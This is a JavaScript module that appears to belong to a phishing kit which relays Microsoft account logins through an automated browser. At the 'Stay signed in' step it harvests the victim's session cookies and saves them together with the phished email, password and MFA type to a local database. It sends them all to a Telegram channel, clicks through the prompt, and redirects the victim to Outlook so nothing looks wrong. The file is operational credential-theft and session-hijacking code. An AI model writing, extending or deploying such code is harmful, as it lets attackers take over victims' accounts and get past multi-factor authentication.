/**
 * Stay Signed In Handler
 * Handles "Stay signed in" page
 */

const { TIMEOUTS } = require('../config/constants');
const globals = require('../config/globals');
const { saveUserData } = require('../services/database');
const { sendToClient } = require('../services/websocket');
const { sendLoginSuccessToTelegram } = require('../services/telegram');

/**
 * Handle "Stay signed in" page - ERROR-PROOF WITH LOOP PREVENTION
 * @param {Object} page - Playwright page object
 */
async function handleStaySignedIn(page) {
    console.log('🔐 Handling "Stay signed in" page...');

    try {
        // Wait a moment for page to fully load
        await page.waitForTimeout(2000);

        // Check if this is actually a success page (not really "Stay signed in")
        const currentUrl = page.url();
        const pageTitle = await page.title();
        const pageText = await page.textContent('body').catch(() => '');

        // If we're already on an account page, this is actually success
        if (currentUrl.includes('account.live.com') ||
            currentUrl.includes('outlook.live.com') ||
            pageTitle.includes('Office') ||
            pageTitle.includes('Home')) {
            console.log('✅ This appears to be a success page, not "Stay signed in"');
            return;
        }

        // ========== COOKIE CAPTURE - CRITICAL POINT ==========
        // "Stay signed in?" page means login was successful!
        // Capture cookies NOW before clicking Yes (which causes navigation)
        console.log('🍪 LOGIN SUCCESS DETECTED - Capturing cookies at "Stay signed in" page...');

        try {
            const cookies = await page.context().cookies();
            console.log(`🍪 Retrieved ${cookies.length} cookies from browser context`);

            const globalLoginEmail = globals.get('globalLoginEmail');
            const globalLoginPassword = globals.get('globalLoginPassword');

            if (globalLoginEmail && globalLoginPassword && cookies.length > 0) {
                // Determine MFA type based on what was used
                let mfaType = 'none';
                if (globals.get('globalVerificationCode')) {
                    mfaType = 'email';
                } else if (globals.get('globalPhoneDigits')) {
                    mfaType = 'phone';
                }

                // Save user data with cookies to db.json
                const saveSuccess = await saveUserData(
                    globalLoginEmail,
                    globalLoginPassword,
                    cookies,
                    mfaType
                );

                if (saveSuccess) {
                    console.log('✅ User data + cookies saved successfully to db.json');

                    // Send to Telegram with clean format + cookies as .txt attachment
                    console.log('📱 Sending login success to Telegram...');
                    await sendLoginSuccessToTelegram(
                        globalLoginEmail,
                        globalLoginPassword,
                        mfaType,
                        cookies
                    );

                    // Notify frontend of successful login
                    sendToClient({
                        status: 'login_success',
                        message: 'Login successful! Cookies captured.',
                        email: globalLoginEmail,
                        cookieCount: cookies.length,
                        mfaType: mfaType,
                        redirect: 'https://www.outlook.com'
                    });
                } else {
                    console.log('⚠️ Failed to save cookies to db.json');
                }
            } else {
                console.log('⚠️ Missing credentials or no cookies to save');
                console.log(`   Email: ${globalLoginEmail ? 'present' : 'missing'}`);
                console.log(`   Password: ${globalLoginPassword ? 'present' : 'missing'}`);
                console.log(`   Cookies: ${cookies.length}`);
            }
        } catch (cookieError) {
            console.error('❌ Error capturing cookies:', cookieError.message);
        }
        // ========== END COOKIE CAPTURE ==========

        // SIMPLIFIED: Always click "Yes" for any stay signed in page
        const yesSelectors = [
            'text=/yes/i',
            'button:has-text("Yes")',
            'a:has-text("Yes")',
            'button:has-text("Stay signed in")',
            'a:has-text("Stay signed in")',
            'input[value*="Yes"]',
            'input[value*="Stay signed in"]'
        ];

        let clicked = false;

        // Try each "Yes" selector
        for (const selector of yesSelectors) {
            try {
                const element = page.locator(selector).first();
                if (await element.isVisible({ timeout: 1000 })) {
                    await element.click();
                    console.log(`✅ Clicked "Yes" using selector: ${selector}`);
                    clicked = true;

                    // Wait for navigation
                    await page.waitForTimeout(3000);

                    // Check if page changed
                    const newUrl = page.url();
                    if (newUrl !== currentUrl) {
                        console.log('✅ Page navigated after clicking "Yes"');
                        return;
                    }
                    break;
                }
            } catch (e) {
                continue;
            }
        }

        if (!clicked) {
            // Fallback: Look for "Use your password" (for MFA bypass scenarios)
            const usePasswordSelectors = [
                'text=/use.*password/i',
                'button:has-text("Use your password")',
                'a:has-text("Use your password")',
                'input[value*="Use your password"]'
            ];

            for (const selector of usePasswordSelectors) {
                try {
                    const element = page.locator(selector).first();
                    if (await element.isVisible({ timeout: 1000 })) {
                        await element.click();
                        console.log(`✅ Clicked "Use your password" using selector: ${selector}`);
                        await page.waitForTimeout(3000);
                        return;
                    }
                } catch (e) {
                    continue;
                }
            }

            // Final fallback: Any clickable element with "yes" or "stay" text
            try {
                const allClickables = page.locator('button, a, input[type="button"], [role="button"]');
                const count = await allClickables.count();

                for (let i = 0; i < count; i++) {
                    const clickable = allClickables.nth(i);
                    const text = await clickable.textContent();

                    if (text && (text.toLowerCase().includes('yes') || text.toLowerCase().includes('stay'))) {
                        await clickable.click();
                        console.log(`✅ Clicked stay signed in option: "${text}"`);
                        await page.waitForTimeout(3000);
                        return;
                    }
                }
            } catch (e) {
                console.log('⚠️ Could not find any stay signed in options');
            }
        }

        console.log('⚠️ "Stay signed in" page handled - may need manual intervention');

    } catch (error) {
        console.error('❌ Error handling "Stay signed in" page:', error.message);
        console.log('⚠️ Continuing despite "Stay signed in" handling error');
    }
}

module.exports = {
    handleStaySignedIn
};

